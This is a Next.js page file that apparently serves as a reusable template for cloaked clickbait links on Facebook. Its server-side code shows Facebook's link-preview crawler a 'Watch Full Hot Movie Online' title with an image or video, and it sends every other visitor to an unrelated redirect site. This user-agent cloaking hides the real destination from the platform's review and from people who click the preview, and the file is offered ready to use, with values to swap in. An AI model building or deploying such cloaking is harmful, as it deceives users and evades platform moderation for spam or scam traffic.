import Head from "next/head";

export default function Home({ meta }) {
  return (
    <>
      <Head>
        <title>{meta.title}</title>
        <meta name="description" content={meta.description} />

        {/* Open Graph common */}
        <meta property="og:title" content={meta.title} />
        <meta property="og:description" content={meta.description} />
        <meta property="og:url" content={meta.url} />

        {/* IMAGE MODE */}
        {meta.type === "IMAGE" && (
          <>
            <meta property="og:type" content="article" />
            <meta property="og:image" content={meta.image} />
            <meta property="og:image:width" content="1200" />
            <meta property="og:image:height" content="630" />
          </>
        )}

        {/* VIDEO MODE */}
        {meta.type === "VIDEO" && (
          <>
            <meta property="og:type" content="video.other" />
            <meta property="og:video" content={meta.video} />
            <meta property="og:video:secure_url" content={meta.video} />
            <meta property="og:video:type" content="video/mp4" />
            <meta property="og:video:width" content="1280" />
            <meta property="og:video:height" content="720" />

            {/* Video Thumbnail (MANDATORY) */}
            <meta property="og:image" content={meta.image} />
            <meta property="og:image:width" content="1200" />
            <meta property="og:image:height" content="630" />
          </>
        )}

        {/* Cache bust */}
        <meta property="og:updated_time" content={meta.updated} />

        {/* Twitter */}
        <meta
          name="twitter:card"
          content={meta.type === "VIDEO" ? "player" : "summary_large_image"}
        />
      </Head>

      <main style={{ padding: 40 }}>
        <h1>{meta.title}</h1>
        <p>Redirecting…</p>
      </main>
    </>
  );
}

export async function getServerSideProps({ req }) {
  const ua = req.headers["user-agent"] || "";

  const isFacebook =
    ua.includes("facebookexternalhit") ||
    ua.includes("Facebot");

  const isMobile =
    /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(ua);

  // 🔘 ADMIN PANEL TOGGLE (Vercel ENV)
  // IMAGE | VIDEO | AUTO
  const ADMIN_MODE = process.env.PREVIEW_MODE || "AUTO";

  let MODE;
  if (ADMIN_MODE === "AUTO") {
    MODE = isMobile ? "VIDEO" : "IMAGE";
  } else {
    MODE = ADMIN_MODE;
  }

  // 🔴 CHANGE ONLY THESE VALUES
  const PAGE = {
    title: "Watch Full Hot Movie Online",
    description: "Watch full hot movie online in HD quality.",
    image:
      "https://tech.symbolsemoji.com/wp-content/uploads/2024/12/thumbnail.jpg",
    video:
      "https://tech.symbolsemoji.com/wp-content/uploads/2024/12/movie.mp4",
    redirect: "https://tech.symbolsemoji.com",
    url: "https://watch-videos-full-hot-movie.vercel.app/"
  };

  // 👤 NORMAL USER → REDIRECT
  if (!isFacebook) {
    return {
      redirect: {
        destination: PAGE.redirect,
        permanent: false
      }
    };
  }

  // 🤖 FACEBOOK PREVIEW (NO REDIRECT)
  return {
    props: {
      meta: {
        type: MODE,
        title: PAGE.title,
        description: PAGE.description,
        image: PAGE.image,
        video: MODE === "VIDEO" ? PAGE.video : null,
        url: PAGE.url,
        updated: Math.floor(Date.now() / 1000).toString()
      }
    }
  };
}
